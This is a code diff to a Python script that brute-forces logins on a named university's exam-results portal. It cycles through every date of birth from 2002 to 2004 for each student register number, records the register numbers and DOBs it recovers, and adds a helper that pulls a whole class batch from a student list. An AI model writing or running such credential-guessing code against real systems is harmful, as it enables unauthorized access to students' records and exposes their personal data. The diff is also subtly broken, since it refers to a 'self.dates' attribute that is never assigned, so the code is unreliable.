@@ -12,6 +12,17 @@ class GetStudentMark:
 
     def __init__(self, rn) -> None:
         self.regno = rn 
+        dates = pd.date_range('1/1/2003', periods = (365), freq ='d').strftime("%d/%m/%Y").tolist()
+        random.shuffle(dates)
+        dates += pd.date_range('7/1/2002', '12/31/2002', freq ='d').strftime("%d/%m/%Y").tolist() 
+        random.shuffle(dates)
+        dates += pd.date_range('1/1/2004', '6/30/2004', freq ='d').strftime("%d/%m/%Y").tolist()
+        random.shuffle(dates)
+        dates += pd.date_range('7/1/2004', '12/31/2004', freq ='d').strftime("%d/%m/%Y").tolist()
+        random.shuffle(dates)
+        dates += pd.date_range('1/1/2002', '6/30/2002', freq ='d').strftime("%d/%m/%Y").tolist()
+        random.shuffle(dates)
+        totalDates = len(self.dates)
 
     url = "https://sist.sathyabama.ac.in/sist_ese_june_2023/login.php"
     student_details = []
@@ -55,15 +66,14 @@ class GetStudentMark:
 
     def findDob(self):
         attempt_no = 0
-        for dob in dates:
+        for dob in self.dates:
             body = {
                     "regno": str(self.regno),
                     "dob" : dob
                     }
             reponse = requests.post(url=self.url, data=body)
             print(f"trying..... {self.regno} : {dob}")
-            print(f"remaing {len(dates)-attempt_no} attempts")
-            attempt_no +=1
+            print(f"remaing {self.totalDates-attempt_no} attempts")
             if self.checkCredentialsCorrent(reponse.content):
                 print(f"dob found")
                 
@@ -72,25 +82,24 @@ class GetStudentMark:
                 break
             else:
                 print(f"trying again....")
+                attempt_no +=1
+
+
+
+def getRegno():
+    students = pd.read_csv("student_list.csv")
+
+    students.where(students["Updated New Batch"] == "2025-CP-A-FA01", inplace=True)
+    students.dropna(inplace=True)
+    return [str(int(x)) for x in students["Register"]]
+
 
 if __name__ == "__main__":
 
     pd.DataFrame.to_csv(pd.DataFrame(columns=["regno", "DOB"], data=[]), "student_details.csv")
 
-        
     all_regno = [41110198, 4110189]
-
-    dates = pd.date_range('1/1/2003', periods = (365), freq ='d').strftime("%d/%m/%Y").tolist()
-    random.shuffle(dates)
-    dates += pd.date_range('7/1/2002', '12/31/2002', freq ='d').strftime("%d/%m/%Y").tolist() 
-    random.shuffle(dates)
-    dates += pd.date_range('1/1/2004', '6/30/2004', freq ='d').strftime("%d/%m/%Y").tolist()
-    random.shuffle(dates)
-    dates += pd.date_range('7/1/2004', '12/31/2004', freq ='d').strftime("%d/%m/%Y").tolist()
-    random.shuffle(dates)
-    dates += pd.date_range('1/1/2002', '6/30/2002', freq ='d').strftime("%d/%m/%Y").tolist()
-    random.shuffle(dates)
-
+    # all_regno = getRegno()
 
     threads = []
 
